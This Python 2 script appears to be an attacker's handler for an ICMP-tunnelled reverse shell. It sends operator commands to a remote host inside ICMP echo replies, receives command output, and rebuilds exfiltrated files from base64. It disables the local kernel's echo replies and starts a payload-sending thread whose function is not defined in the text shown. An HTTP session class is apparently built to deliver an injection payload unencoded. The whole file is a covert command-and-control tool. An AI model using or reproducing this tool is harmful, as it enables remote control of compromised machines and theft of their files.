#!/usr/bin/env python2

from __future__ import print_function
import shlex, tqdm
import os, sys, time
import base64, binascii, hashlib, uuid
import select, socket, threading
import requests, urllib
try:
    from impacket import ImpactDecoder
    from impacket import ImpactPacket
except ImportError:
    print('You need to install Python Impacket library first')
    sys.exit(255)

LHOST=raw_input("Enter LHOST: ")
RHOST=raw_input("Enter RHOST: ")
RPORT=62696
BUFFER_SIZE=110
INITIAL_UID = uuid.uuid4().hex[0:8]
DECODER_UID = uuid.uuid4().hex[0:8]


class NoQuotedSession(requests.Session):
    def send(self, *a, **kw):
        a[0].url = a[0].url.replace(urllib.quote(","), ",").replace(urllib.quote("\""), "\"").replace(urllib.quote(";"), ";").replace(urllib.quote("}"), "}").replace(urllib.quote("{"), "{").replace(urllib.quote(">"), ">")
        return requests.Session.send(self, *a, **kw)


def clear_buffer(sock):
    try:
        while sock.recv(1024): pass
    except:
        pass
        
   
def main(src, dst, UID):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error as e:
        print('You need to run icmp_alamot.py with administrator privileges')
        return 1
  
    sock.setblocking(0)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    ip = ImpactPacket.IP()
    ip.set_ip_src(src)
    ip.set_ip_dst(dst)
    icmp = ImpactPacket.ICMP()
    icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)
    decoder = ImpactDecoder.IPDecoder()

    cmd = ""
    download_buffer=""
    DOWNLOAD_filename = ""
    RECEIVED = False
    
    while 1:
        if sock in select.select([ sock ], [], [])[0]:
            buff = sock.recv(65536)
            
            if 0 == len(buff):
                sock.close()
                return 0

            ippacket = decoder.decode(buff)
            icmppacket = ippacket.child()

            if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():
                ident = icmppacket.get_icmp_id()
                seq_id = icmppacket.get_icmp_seq()
                data = icmppacket.get_data_as_string()
                
                if len(data) > 0:
                    #print("DATA: "+data)
                    recv_uid = data[:8].strip()
                    if recv_uid == UID:
                        if data[8:12] == '[P$]':
                            if DOWNLOAD_filename and RECEIVED:
                                #print("DOWNLOAD BUFFER: "+download_buffer)
                                try:
                                    decoded = base64.b64decode(download_buffer)
                                except:
                                    decoded = ""
                                    pass
                                with open(DOWNLOAD_filename, "wb") as f:
                                    f.write(decoded)
                                    f.close()
                                with open(DOWNLOAD_filename, 'rb') as f:
                                    md5sum = hashlib.md5(f.read()).hexdigest()
                                print("MD5 hash of downloaded file "+DOWNLOAD_filename+": "+md5sum)
                                print("*** DOWNLOAD COMPLETED ***")
                                DOWNLOAD_filename = ""
                                download_buffer = ""
                            if RECEIVED:
                                cmd = raw_input(data[8:])
                                clear_buffer(sock)
                                RECEIVED = False
                            else:
                                RECEIVED = True
                        else:
                            RECEIVED = True
                            if DOWNLOAD_filename:
                                download_buffer += data[8:].replace('`n','\n')
                            else:
                                print(data[8:].replace('`n','\n'),end='')


                if cmd[0:4].lower() == 'exit':
                    print("Exiting...")
                    sock.close()
                    return 0

                icmp.set_icmp_id(ident)
                icmp.set_icmp_seq(seq_id)
                if cmd and cmd[:8] != UID:
                    cmd = UID+cmd
                icmp.contains(ImpactPacket.Data(cmd))
                icmp.set_icmp_cksum(0)
                icmp.auto_checksum = 1
                ip.contains(icmp)
                sock.sendto(ip.get_packet(), (dst, 0))
                

# Set /proc/sys/net/ipv4/icmp_echo_ignore_all = 1
with open("/proc/sys/net/ipv4/icmp_echo_ignore_all", 'wt') as f:
    f.write("1")

try:
    th1 = threading.Thread(target=send_payload, args = (INITIAL_UID,))
    th1.daemon = True
    th1.start()
    sys.exit(main(LHOST, RHOST, INITIAL_UID))
except (KeyboardInterrupt, SystemExit):
    th1.join()
except Exception as e:
    print(str(e))
